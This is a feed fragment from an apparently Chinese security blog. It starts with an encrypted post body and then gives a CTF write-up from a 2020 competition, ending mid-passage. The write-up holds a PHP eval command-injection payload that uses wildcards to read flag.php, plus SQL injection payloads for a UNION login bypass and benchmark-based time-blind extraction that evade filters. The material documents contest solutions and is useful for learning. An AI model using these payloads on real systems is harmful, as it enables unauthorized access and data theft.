864999c923377fde9ee2606de1b9836ead972fadcf0046d2cd992db5303425a88b94ad0c129632eafb479da5fbe4fe680850a648f683d804a749c7b78f9e78fec30e56e838a856e6ca4eb9d0c4a8ff08faa82459d37ba45078c0d6dbc6dd53f54c4a29fc1a4e8a1980d32834e7112ba0ff2bad0dd7c865515fc35723707857def04f61c5f7d584c068b298de2f2683d0c35f241961feb74a211a09a9f188367ba4f9895bff24b7abb937df1201b91908b106b0f4af124fe385be76eb32dcb5e7af4b5a3d79cffb2269c2c1e4f41064e3e6becd7b64472724d38f6d9820ef2d6db58e52cd1dd1d5c140971991537cc649fdfd0514403fb0f08da74371700175367e0626ccf2d6e44d0153f8cfe1d574b11c8299cc3a2d163efc789a5381135e294a7c0eaf13c33b41618bc699cc0caa93a170f4ba5cc3b3dbc90f0a0c2ea0ad8af1216b1051b2267ad0971b12f341aa30baca922e95003283c8916cecda64ac5acd8c99beccb31a7508afb2ecddf5d1b0c64db879fd80e333f1465a2f18cc99b076ca5b9f0f87149d747b0594a86729b478c805be083147bacbde4f89b36776b3a42b873457c6cdafd8f794841b2f0d483df5acdc9dd0144a0cfa7cabd3f459ea7df8c0e78cabba93a42ab4da6e9911f70320504ead7dbac96c0a342977db285a42ddf9dfa00cb4f985cf970bd2da43847655165ee8b3cf227b6159327e7ffbde598a02ddfdafc77ad7559e65aef6dd374bdc2c28d5b44332ca3f8cb5decf9d0aaef2836f1a5dd46a36c558977991bea4a986fa832bf93215071c5e8914160ad5071260d583b1b3f0d102b49f62faec6c24f8abadb334784b79c622c4f36d3ef3d5127178c1224a90e19c9ae1b04a67b266a1b088faa9e916273cd1b781c39c51554b0ddb665df29d875441cb580958035d318b94fd611d99f5e130a037f31026753931a60ee13b0555bb01ead8e1d5d0626af261a95a0977e516e6cfc3eb5072178412f199447fce86e0b88a1a2e744c6cb80320833c08e4a9f0ea9c61f0a9781d6cd0faf211ccbeef6f97825e2d0e1d9352877f43ef238f26041fced8c652947ea7357b2ded19fc376991ff155a6b40967be19af3f4738b3c7de1d8cbd1618943b2d03d9864e2a846576f09afe4e9f15d772b99fb9887f172904ace471dc90a40c2c9a958bf9938f019c6c868d79012705778ef223cc7750ecac2b60815eaaadb7191a6b0aed8422aa71cce7350e891600d6cb2c5ba072cbff2be84ed5b50d88fbdaa67960f62299c1f786541a782e723ca7dae32de41edbd114fb7ccb2df37ed861b3a01f4c9df4407219a590751c0bcdda0ea3ab9b41ab9a80434aeb07553995f4273c9a9b40d687f59638ee4a70db59af42e1a46c9ebb68a163e9e66279d70a92c1041bf679894673b7c6dbdf07f4187ca60eae301dca9892ab84ad245a04284b29798e0174c58182fe65f31cf0e01b9894f85584d50ab6dd02e98bde96bd45bc7e744b722b6192c76822a4b7b7f6b7ac5fd7d9950ea1f83ca89f4692110084b8f0e5f70eee81f4e6ff0b1543dc0e7f7a8e8e7ad44df4578f33ef43bc9a23567f955cac7f4520e5808acda41564ae927d95b1d6caca9f8990df544d515c47ef1e9c3a16c939afda0a6f8b43ffcb1b4851d131a918f9543f5d4369fff176c6e7421b84a8bd6db8785e477655888f5af4a19a608e9fcbb4494b8e045c8128747877b812039223dca23cf33a60d99afdda1e471f2f63244b97ad406240cf9e84b56f7a6fd626de9219e37291c0aa024d3ee064fa06ed0db83c1c9a1d292696fffa2983bf904bcaedff57d7dc38c53c258c3b0cc3e98ad843eff3096f41d1f4784d664f4764521700f643dbc8998e7ac847039c0b31383b42086593dbdcff8f9075015f1d6bc369ea21c2f3a9de4c2f38e3a48f4a87d4cf44062c7333162fcd5742ee73f8e163602bbd6e6425e71ab4b1646157876142da3c862fc279392e83b66d52c0bb6281c3d5c9978bff65cfe563a6f6f88ea0e679eb257aebd2cea2b2032d7da7ce54e3693a8a563738f759670948f4d01235ed437d18d64b95f50f6867de16a120a6fa56958da0167d719a461c7ecef61224c71f9853f9d017e92b06ac9c4b2fff722e6a0cd91c8a86f36e505ee9d40536e7f3a8dc426a0f3cd5c5b8d7fe7c2212fa60475a623c4e8bc49ed8235b18dceb923c95c945793e75a64518ccea18b7982ab5eac94c448b9b16ffa4738d0bd50d48241d66b020a41b66e082a5eda739e9f4f91f129bcc33b8d6fcb81d8714756082ed3a8208981a0eb1a5a99d6f169e2423d52067036975deda513f38fc1d47ffb8132020a0dcd230c8d72a1b1e3d71bb239c67176b9d17e25c610ed871018ec2c9e6cdb2c7fb62d21470abf0bba83d3bf750fe875e21e20deeca531a39828e1dd44e4ed04f3500dcd4b9452896aa88ad1022a3494d3b24dbb2dc0f374cccd7cd0ef265893c8839d02014a7268fb5463d3bd5753c963b6af610be0b284f0b50781ef8cd7dcaf0b3499fed103ac01c99cfbc3b30d6e2740a41f41967e876f5aed8c8cd0f7c41d5fc1f61a7e03d99b3114cd52e235bdfec77930177ed257006804327c03a293c5e61e8515b9feeecb7ba7e68ccca65f76f7f943f1c2d5078422e26030ea63388c5b2c0423d57e01e5220358ba2a87dbd8540e89056c7a035c42a4655f0d8fed4f03175a6013759f0168461ea2bee0f3a17181e51da6fff5ce051cc2fc84554c8f84361647c72fdcb414585486be66746b75460803ee4d3acccf959fb46442ce3dd17156def7f605d34d794420ed533cd59ab177c833e4f1a4200f38a29530a92efcea30ed770b396d7b0c4f57076721db931a5fceda95be8e6d887579cc39a06d7217e66d12f9a007231465dce24f6fb6c9c20e92326bd047e8c1ccdfeecacc816f03676b24030e34b0d2f999dfbaf70dfd2a818c30530c90bb0b324cecfdfc01b010de8c3e9c6c930003d7c96ae6173c49058ff3457fb74b00a10411cd11a20cb78e24cf1f402b681557222effc67b71c91c8187660d7e4bb080b5f50d35cbb6dff509721789a06d918bb23074c03bc6952dbacf3cd531f834d94d58d4fbf42fe79c60805dda5bf9f354a3c4d027890bfdaa019f1708256b0fdc79c5fa04083dc8b5130b71ad930ade82a9351999460975b6f8d44f3b1e470013dbf62ebfc3fbd794217c530f5d75d98517371966aebd79fc3acaa5677645f01ffc5589dfd7a0713f03ac437b588635d1c4530908bbcf04699569ed28fda6c411e50848969f44af43224f6a191a1322b68ba765074f0e24f0b5a03a9615abca11ae58b3df148f2c6f8603cb5667f37dbc8f9dceb9f45e80e2988a441066a09353191d887695ef1543a9f27937a9bf586a3b6181afcb9b93f3fd3fa04208b90b491e70a46892ab27743c70f3acfcc2b05c9c03fb930820db9a80427c2d3b6bb596221390289d1b23442bb102b392b49dfbb5c790469d3e2928cf8ebaa96f923d5cd9c6e60458005fe05c928fe0e3982a3b98c5b2d15649a3c0c5cfb2e4b94fd8b94f1be1ac91fd33d3a0b00074493f0fa83bd1916e33c704fd4725aefba448c6d03e39f4888ba7b79d5c37e63eb4eb7498e710745053d1bce3313bd4e94ce6e330ac9403e299a80459e0e83d12a6cc13ba6cc470f16148a24dd04d547d44c13f4c8d980b5f8b124dd7959e6025c91075a7a610e8cd0182d2ff52c7a9285f22377a0a7300a7dd9b714f6969ebdef6c27ab714ae5df07c3c52975909470cd22c8c267f72c43849b567f6e12db0d2d3b60e5d95409852c2b40f9c56445b41054979b5240a4cbee129e9b8715a117df1118cee6258674bf4068e2924b402a8c31e0433956b7b7cfe35f1f07fc6dbe104925d9bb015dd4cfa011eca02e713ac9a476eee7cbc8d02a5681f7564b9661459c34ca26884838d934033e2dfd126976df365de36178bc7e2373633bbcd6042191e311b7fa166615b5fe7fbe973403eceb987a180f40d894608195163b99dc75824295fd53d46bb368f00a2b23f40db01013212d07831f4508a247cdcc81f96de438bc6cf62887e7208a43bc33fa9e7cf7b21c92e72e64596f19e1be47a7d0b06d44746121192a82df6488074ba1ea73b975341d5aace3e1dd7de77a14457faa725814110309dc59f69779768529dc581cd01fcfc54ddec12147fe91d1ed38aac10e31a51c92ce4d345b4f7ff0ce4cebc8312d799c955503b5d4cfeb24ff10dbf1500ce655cbeff15b37a3da2c973de9b57ac5dd3da9d4c3eb2d0e7d7376f33ccb2e19ad5b91e629c352771d1ee0170a94766b087190d5a9f2fca86eeae804a82d6008b2c826d034996619c3b6bbcd09e169e520037d1ed5111dab95b77065ec0231a34e21030af81ace5e264f16e1fab60d875dda25ad8e0b10fbdf827930b48d723d70ee66c51f2658efea93e61d16730ca2bd1e6121b284849242fdb22228b9a0dc96500d5451fe4f0f04579fe6c90d462dedf657a119dd034b8eaf6b79c0d26f47b3362c7ae897ccb662d848edbf60aee1d176dfc95c26f0f76e3af17af4eb3bf6a173051e74671e5c07e155ba9d3ba494bfe05dfdf84e98a50a56b8ba8641cd7ae5e4e9eef69c08feb596711ae938ecde536c34332bbc3687168ecc73b07bb1035ef4daf4665886fa471f1e39c6f4f58c37a70efeb308d3f5e38b8e648f5bf845a36e46290463c40aa192bd64d3036b9dabc7797f6cea8473e0af72e13c893af20d88922e2b2fa945641aadbecc9ad39edff7b545df77b59b4711d49dbec08f27adcc552bae984c28601849d95df21ab5a8acf41a486845b84bd78e379165973f632a9a555963445a21d8f0df07e3a4460b7f6af0962a4d22467f0811edf5c3a04d83bf8d52bbf09c5c32c9129d159a72068cd7cae16dd1cd50d98dbc0fb317165c46c3225a077aa4a87678193536e71fdecade710f3f4780e7f5234dc36eb55352c0b35a95a12c923ea0dd224dbac3525880e33925cb77c0c5434b52374cbff1c7eb1e88d2bcbe46639a7224f009bec3a17fe041813b0a27fb4ebec89ec9477b7d3b219a2a0a5113c95ae810696d752eb24686626d80393ce1ce02430e0d5cd242666181abc54160ab14e27b5a26c916185eebaf8123daa362ad05fcf0af55b514781a0e588be4c2bc6480c86cba3e861884d29ca427058ba6983f2ffbf6213998ec6ad5a19f71f5a442f960495614efd3a5cd03594b11f747c78a99b3376ce023ae4afa314dcbd7c357524c0aaf34c8dea39d439fefb6a69ebe21f00c2649372106d426bd082282c289294d944b08ad3a932c4fdf7cf4750780e0bd7c30b4919ea6d141f6f8f037a6f0b1918d009ccdc90fa05c1265732de49ba8c28e9f6bbd62b1dc418adbc4a52ea73fa0242ab28694c6538cf8068dad7e453ffe3105ddf9f03a11005d08c5abf9e66dbffc4a3151a57dc5ae3564e4d010528ab2a8d38112ca51f91e7cb187557e6ec648843c97453608d090f462843281535996171b57858b62a383220438146b032b43f1304a1c5eeed1f54cd015a62c48d34c5e3effb1c00b6721ecc9ab5ee2c35c821053312ca790432b87fb83d073b533bbd18f7ecc5949005976d9bb9df6f0e40814dd85e5fab620bb47de6c5f021173c0b6c42eb0a09bfe09307bbdb4f265aa7bfbbfb552f49641bf2bff49b59618eab0269a2c999f70abfad2bc5cd0eb784425e817f46feeacc87b2fc4fb7f3275790df16ed5bd2a51908ca6d99837c19c218ecfc2293e1acaf0e724964d8b9fbd5e08b4b0e1e886d9f6ec634caedcbde4e90053d6b4a1b7595ffeef43b22e032f2dda42c88ecc493f9e854c446cd47b21830fd4f57de845c42bada0385637e67e897446e91e2be7f6fb08c24ac01cd039292b9d9deee84dfd8b3a8f6db0ff4a98b534b2254fb65cd5a5a1089c2faffe5cc8f50529f30190ad5866b3254175208b8d02c578f1050b4db6241521c64e188b8e9df070b5e6ccae5cf2cd636efd0aec55a79dd1f419ae185f832a3c9bb5984e522d113fb25bba40ee99a39c3ef31b33871dbb11f1f5f3ce190048deafada6a82b93300fef1aecbcb47fc1349be8eed74b170a932131bd3610917f93f387d2f4ec4c2a400af8e84011e0723a01461a5b1d8b4baec1abba8a07f7e91aafe36cd22d1aaee2150308fcd2beb7db10618d24bb94e5e233e8174294167f412c0e52c977ff371350ac6719bafd89d0f062bb210002103c511c3570c40a7004300dd32bc8fb7efaa794648fd21eef3cf416904f9ab7e20f67301062eff15ec8663934982127cc9599c546fd2cd6e621ab56eba916fcf80791a6e4634c74aa03d9e57f1728bce3ba8c9bb21d94ad61d79d21bf75345e554b766cfa30816610677be3418ded765029cc8e5130cac25abbd9e9243c7a306178c6bc2bba0edc9da646676d314ecca22cbaaf4e81523b7b190563ca856076f64631a560d410ef7f6cce13b89ee022ea56da2c1420eb9bd63a234473856157939a98ced86c33625969f8bc206303cebe6fd212f9abb4c2026810197e559091d8176cd77916215ebfb8d285f27b215f128329f73579d3f339df5ec8cc0591228bc7ddbf538ef718f45fa824275e1b9c93e3ef47d95e8d4fe53824b9d7b9dbad552dda396ff9d2209849ac11b921e6a0234dd269b9b55cc673d941ecbdde15d1f4a19167181a267ecb00f754941508f8398d998beba03a75003179ec9a6c464f1706ec9d1a7aeff6bd1320ad76de944cc86bee5ae69e115c687558c416f0a23b60e81a7089e0662f2d07f176fc5d677a866cf31d3273a96bf546244f29e63b97d74b97a5aa6fd6298b7ebc062532f3f6dcda5656abd15aceb35033cd2e9f6c302f7723f71afa58b37ed688276acedcc4ea81069e6e0a7fc55df399c49123e0c81300000c60c61db04ae187e4ea959e698b7fb6bc77f2061679a431b3e74cdee3fdaf667363461167402cf160f2e5255359fdb873063dac8b6dc145bd8d16e43e5a62c09ba399f1dccf15dcc6e85803a5188d9c8d676eccd2c3bc348ac76088ebbd75a3cb88a6226d419a24900a2e6c1ae0c0c66e49ed735f2f08f98245908ab70e52744472a66a17bd4119213df29915d77e861c291e2277ad09d1772d2c4e5cce7736a2a558a34977b2fd0339ddac4519d5226832500d6de0aa2d4a82e9a5634da34746dbb67857a811f2c9680603c93bc304633b131e0857e51d1e484c0b42846a85f59ea0447e839f692716fad3a30f22b0990d8d4cdfd305071488ceb0e9ad106b2e791a558f1e49021705828907b1f32eb7a8b78dc5122ff1cc9552c4e343552fb3640a3e20b54698a9ceb506dc19c1d3e5127a4cefda4141cb3a28517bb43a257a7d9c502edef0c15820c4593a0046e6f1beee882bae2e618cffebd3d56b0094e8b9e3ecf0e3b4981b9f54ec9525ccca8db1101f278a34951830d62b0c9b89e2644b67bcd5046a86115e14680da0d52acc8b349c977ea610380cb16fb071f42f0bc9d9fa13a7e10da9e7c11a851cad6157407fc7f7a8e8730c8c03979d7f027bf64fe9c946de4ff24c89fec661168b3e0cf6c2717aac1fe7e415fb855bb1059db73b14c89e85f6093805e0e1e476ba10ede82cfc369ac8484ef65ba5ccfcb74c02246a7f7b01659c34eec8dded27334334c7fa5ff80a8a5e3f9ea2a4dd6b847534dbeb3cd9d9cd0f23760300f8c160321446bd600b0661472a59e3ee5c1a50810255a54bec764e0d77236ec84c2c5e4e6922a591397a740f4a6f2964eceb471d4954cda6eb44ee8106d4e4b5d342fa7b2e10cc75c3d336592d9cb3a05e84ed1a02e1e1228cce2e9d2ee77af308e31c589f89673f40886fa5e9fbd631663d4e543f268a3fa27d77ae366a5ab6305f116572c383902427cb4b3e988d212733af12136565a1398a825f81931df09c17d0ccb8410ae004f801904361bcb1bcbf5ce959a79f66a9551f2b9a5ab8eee32d93aa441e6edff78dbbb829fac8ae2c6c7cfbb8cc48a169640b63f79e859985ffead06100bbbb195cd82abc0639f5988ef80a7bf5c22465092930c23db28a1c22db8b7a96ff46ee0f5cde837396458ca6693be930d084f5eebf0a9d7592e2f1f0f9498bd56724f7119c8335e38bd495bfc93bf23f7364e8bd5a923ef773fd7e509aa02104cbb5cd2b2bd8d48438d358ab2e5612cac518185c537ab44c6d2139e11780cbfec6ad7f9653a50c99688ffc0c13522f7882a2672970716f3fe2f3b97683bc9f8073add7c38d007a70816b4b59835bb0ee44c07ac6fb445f454aff2c55b3ee9cbc6ab0896175d5368d567a446306ab018eed2f087747164c2065013d76808ce68acbcbf997aeb22e04074cb2f6eb447f5a97982874379f324ddedf159187d5346e0372cc327f29c47996034692fed733cbe81e9e07c758979e8baee0cf318208a9cae661784cb24b868f0efee7d16d57b09ce25f29ecacc5ea9c11a9af19d922d4c42c6d913c6994376158a8a6e6ae9df7610b8e3f906ba43b0f2446d2b9da4a98d5dc65506afc9322cdb9d5859c47125adce8671c66605941c73bbc92c788fc796845663253ecf16862e9e1dd1064206e82d59f0be84b5ab38783aba00297eaedcedff375b3b3d3773d76e321d4b09562954f481ac46fc9a99c37a2956f939e25a66908cf18ccd9042ddeb530ded3afab132d12d288bbf26f813afda911ab355882bfaf6da8b25eebe9fac73322865dcac3711eb9ffe5a1201c04ade343cf24a81e28a865ce63542888a3bf8420e1c7419457d7af929beaee5b561aebe294ff5d53da7deacfcec8318d1e33f43aebeb913882d9e853a74e6d0f58a782f06f4b9e3719a87033ad37ebca5a51afaca0100490bcc7f37487f447068c1dc32e24480d591a02072c391aaef52a6ccf60d0df48803d00d9229ed01e395948275eb97dad554fdcd4339404898c9ee5deca140cf844d539d550a5549fab10a4ee58a008d112ea07e65df45df2a7b041fcc676f470420ec0dc6bfb906e8d7e09fcdae50d6f865cc52d923ab69c11105caa1641b4a74abf05b9d28f9a1afee671906f01cd79c3bb4d16e364bca13628709832253b3beca56948edd3302aa8850449b8adb01c5a4ee31b48e92906ef1c9cc1b8dfc786617143101d44424747a79a6cc962a2309856c4dbecc269bf6090980a1c169f0ba71e7800c3790d4de8421b3dc9a170ffb5e991f90b0fe7e9e5737d8c6fc01da010ec4215a1ecca091ed8cf852d891e5d9074fa241d30927d208917701287da1d59407907d4af2de201f10e72e1a9f292e1064c96acf3e2cf74f27073e1cd8ba2cf4dd5590cdfe3876aeaffa7ddb2cfb0007c168817a13979a2e8b2b805c88e053f1923a36e7bf4fd6cea3934aeccb5e84648f2cd921307b35ed72e0a7b7d6679565fc19def702f260026b16770383db2de451d90bad3eb939c4d90ac5a52c5849380f3dd9f822d0af399a3b01f5b171532746e2ce22e3e66fae016b8ec788fd55380aed1e43529297e77e3dbc2bd71c2bb3dd1ddfde913ea08b5efc8d69024d3f1e2066524778d831096f31c3a41a1b497b7e6fe081d847d2073b7684d3e16d2c5da329d07b87c3f9ab8c9c1c6d286658bc97b7066be53da51d689b1cae0b045aae59b737784a9be49dd866fa99ea32079001f9c05703353411affec8952ab8866597550d26035a145c97ee52cc8d913786baa9d84021ab86a4b8de16f804f8f010bb3cf945e2b0d9fea1f44aae7b7229383671b8acf1185877adb692bbd9c01134cec4246f96b5dd8eb0da837313a9f034e09ff70db267eb102bfa963e93d5c50e1f53539542d09c1c563ceb22a10875486956c985a051f91bf599c3c4ab41f043d16abbc8bc1b89045eeff4066da4a5896ddc6cbda03dce81045344d1b405752b7d9a8d2d44f71da08716ed49f2b7c29b23e31e1dded9e47333f121ec4dc048390d35ba3542379b1e3e78cb47afde0e0619d42f19838fb192070f460801869f1807e25cf6cf52e210da21b8c6447f87f933ee702c5686bd3493293cbc7b0b1bd1a6f93156b835f7a3a1ebf16c3c2d342ff3cb5ae166f6fbe5821a9e98a4289171aca33bef985f8e7d0c411a6c35ba3b5cb604fc79e5e555e0755d980f3c892a09347654dec8c1bb87299613e3b297561287e8e888b91efff951ea28309e40b0a6f578e8bbb8752f3aa7599110bbe29eb5e6ed8917d85b9f35795f76530c1e44dffc868f2473013e149442f049d6456630a3766bce9a2a9037412bafb7abe9b636b72cd43986a9e7408a1c165071ee5998ba7212072b6fda42f0f68f3dda0c40478e5bd1a81efe8d698f6aa07d3d625bc75324b2de87d0af889aad7ce689793a097cca435449078453d4ac24e717b611ab0cef1384c282da5d553503be23b6e0d154a97a770b5b4bc375ca2561ba1e85a741352cd4d14a8e914fa347199f848394611defcb2e4a2a15a7c1d2d625e7cf9f563759f3cd83fd0c3049cb5c035ea94a9cbf2a13967cbb821a11116b8182ebd7a71e2af67e259dcae860152d3f2fde1191d32a15e9f6ce6debe8d2220c1534201a0bd77463d8e3cbf6c8c04bc3ae0d4d0deb2e19d32ec175ea9427085ae0bc4472d9dd262477e0484233e1f8d5fbc0606cfce8a089fbe150abd6011dec6b760cd70e0a0ff777598c5a5f18e5a13db4699f48b92fb5c88897594b0d876acd04babc430c68dfe0581c2b4a1f0a4de1a02d6d32f6b52a1faa7b6f2a4a1ce16e961e7eadecd41482ab9f38c835958efb295cc2c0d2b1a1dbe80e7e7ff5904b0c0d8f310fb24a5fc5a63262cf4a3d5342cc3d8c43764d5f6ea40a624218956847cfd03ffa6652b06ada7c9eb99bda1fc0a920d1a067292048ff2e2f5c3e7da5df7c42df3a757fe6419e273b6174cd4bcbdedca9ca208d367aa8a5926b1ed3b692bc07fd03455669139530df94aca6fd154b87464e66a92c4251c3c57776c2cc9b0d2874b96e66150fafcff1015be97b325a91040a6381da3a9c60b9bf99cd5996bfab84c9dc72bcd4399be2e85eadf2c885a8bbd2cc63fd7543cd63ed5daccdc27b4fc0e63204b049a13a60fef9dd714fd29e57b7d5efc49e1779176928ac9b8adb0da70937d63b5eab30a819f8ba146fe75552f132114570034a0d5806588bb83465aa955f28aadb1de414e31cb3e73e3483acadc612fff2497fe7fbd212fe5fd9e19d1b66d56d0a3f4aba8e96a06994ab16fbeabe3c16f46d34cfcf51e4ffed6a910e0503841546fd4f9f1a01cfff743bd9908ada0d47b05f85987ec6cb4f1961d01b1e024209ce65ea90df6e951e8e721744c0cf1592e2f83c4be9e9ca7982ba74792ebdbda67b4d5c990a115fd1e5adaa4962499c7a2fdb4210c291c7273a505ef74a9adc83e805800958e98911890030dec4456ad485dcbeb148e4d809397998babfbde2d83006a578f38d93fa5dcbf2e8a73642eb1ee2ba5c48a07fc364dfa6a653bb71f6353078c95731a4271c89eea4c341ef93d6227f8e60aa49266bfd93618270abb65c6f35fb892a6f6344dd148092d846623889c93b983e0768dfbf26184d0791f8f31a2afc6de3d1bba1cb1c7376385d58130674d3a39e5a62ecb0fe79748cd456abea003a7713b9784a3d7ae7e8cbfb872e9c20a1e34affbf253f3a7926342092632a4733624d4a1efe30805f0a260f8789e6c7effbf78b7d1d334c3979671724791bd4ebd16d427032cfef70f2bd123af1835fae5ec351e728d17e0811d9263abd4a2d7ed292f6c274de91e4d1026fba02075414d2e75b55ac8772218657040c875b7fbdf8c4b59ff18c6497b6e1bbfdc1f3b7ba530ee351f3543a9f1d90a57b4601344c899e7297081c3bda331e346af2f24dbfe18617299a1399f5690c17bafcf45cebc9dc516b71982f826dc04ad23a3f0fe779402d3633b01ececaccccd6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://c1aysec.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>2020全国电信和互联网行业网络安全竞赛线下个人赛wp</title>
    <link href="https://c1aysec.github.io/2021/01/15/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E7%BA%BF%E4%B8%8B%E4%B8%AA%E4%BA%BA%E8%B5%9Bwp/"/>
    <id>https://c1aysec.github.io/2021/01/15/2020全国电信和互联网行业网络安全竞赛线下个人赛wp/</id>
    <published>2021-01-15T06:48:40.880Z</published>
    <updated>2021-01-15T08:00:02.088Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p>12月份参加的线下赛，补一下，个人赛成绩不怎么好，在这记录一下</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p><strong>web3:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="comment">//flag is located in flag.php</span></div><div class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) )&#123;</div><div class="line">    $a = $_GET[<span class="string">'a'</span>];</div><div class="line">    <span class="keyword">if</span>( strlen($a)&gt;<span class="number">27</span> )&#123;</div><div class="line">        <span class="keyword">die</span>(strval(strlen($a)) . <span class="string">" Long."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>( preg_match(<span class="string">"/[A-Zb-z0-9_$.&amp;;|^~![\]()&#123;&#125;\$@\*]+/"</span>, $a) )&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</div><div class="line">    &#125;</div><div class="line">   <span class="keyword">eval</span>(<span class="string">"echo '"</span> . $a .<span class="string">"';"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>安恒17年月赛出过类似的</p><p>过滤了<code>^~</code>等，导致不能异或取反绕过</p><p>过滤了<code>[]@</code>等字符，导致不能上传临时文件使用通配符匹配临时文件执行的方式（p牛之前提出的方法）</p><p>之前也看过一叶飘零师傅提供的方法：</p><p>是构造</p><pre><code>&apos;?&gt;&lt;?=`/???/??? ????????`?&gt;</code></pre><p>‘是为了闭合这里代码里的echo，之后使用?&gt;闭合之前的代码，&lt;?=?&gt;这里起到了echo的作用</p><p>这里的/???/??? ????????是为了匹配到<code>/bin/cat flag.php</code></p><p>但是这样直接发过去目标会被卡死，因为匹配到的结果有很多</p><p>仔细看代码发现没有过滤a，于是可以通过以下的方式</p><pre><code>&apos;?&gt;&lt;?=`/???/?a? ??a?????`?&gt;</code></pre><p>访问</p><pre><code>http://10.10.22.12/?a=%27?%3E%3C?=`/???/?a?%20??a?????`?%3E</code></pre><p><img src="http://pic.c1imber.top/blog/20210115/6pvr0W6UFWmt.png?imageslim" alt="mark"></p><p>获取flag:<br>flag{ZqhzwSifav4zf2ejop2ieKqxwQaEBOXf}</p><p><strong>web1:</strong></p><p>没做出，说一下思路</p><p>打开题目说需要登录</p><p><img src="http://pic.c1imber.top/blog/20210115/wNNLLKTxEFRC.png?imageslim" alt="mark"></p><p>这里过滤了很多字符，例如<code>or、in、空格、=、&gt;、&lt;、like、^、regexp、substr、mid、right等等</code></p><p>登录很好构造，构造下面的payload就可以登录成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,2,3%23&amp;password=</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20210115/Ub94hMeMfIK5.png?imageslim" alt="mark"></p><p>这里还输出了sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM users WHERE username=&apos;&apos;UNION/**/SELECT/**/1,2,3#&apos; and passwd=&apos;&apos;;</div></pre></td></tr></table></figure><p>猜测后端逻辑大概是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$sql=<span class="string">"SELECT * FROM users WHERE username='"</span>.$_POST[username].<span class="string">"' and passwd='"</span>.$_POST[password].<span class="string">"'"</span>;</div><div class="line">$result=mysql_query($sql);</div><div class="line"><span class="keyword">if</span>(mysql_num_rows($result)&gt;<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">   <span class="keyword">echo</span> <span class="string">"welcome Admin!"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>可以看到这里登录成功后除了welcome Admin!之外什么也没有</p><p>盯着题目看了好久无从下手，只能换个思路尝试盲注，当时首先想到的是时间盲注</p><p>发现sleep被过滤了、这里通过<code>benchmark(10000000,md5(1))</code>可以绕过</p><p><img src="http://pic.c1imber.top/blog/20210115/UX5LfKuCV15h.png?imageslim" alt="mark"></p><p>于是可以通过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if(1,benchmark(10000000,md5(1)),1),3%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;延时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;UNION/**/SELECT/**/1,if(0,benchmark(10000000,md5(1)),1),3%23&amp;password=</div></pre></td></tr></table></figure><p>-&gt;正常响应</p><p>这样的方式去进行时间盲注判断</p><p>这里需要突破的两个地方：<br>1、过滤了<code>=、&gt;、&lt;、^、like、regexp</code>等字符，如何构造布尔逻辑判断<br>2、过滤了<code>substr、mid、in、right</code>等，如何逐位截取字符串</p><p>突破第一点：</p><p>方法一：</p><p>经过测试找到方法，可以通过/除号进行布尔逻辑判断，这里通过<code>cast(除法运算结果 as char(1))</code>可以将运算结果转为0和1，由此就可以解决构造布尔判断的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(version());</div><div class="line">+------------------+</div><div class="line">| ascii(version()) |</div><div class="line">+------------------+</div><div class="line">|               53 |</div><div class="line">+------------------+</div><div class="line">1 row in 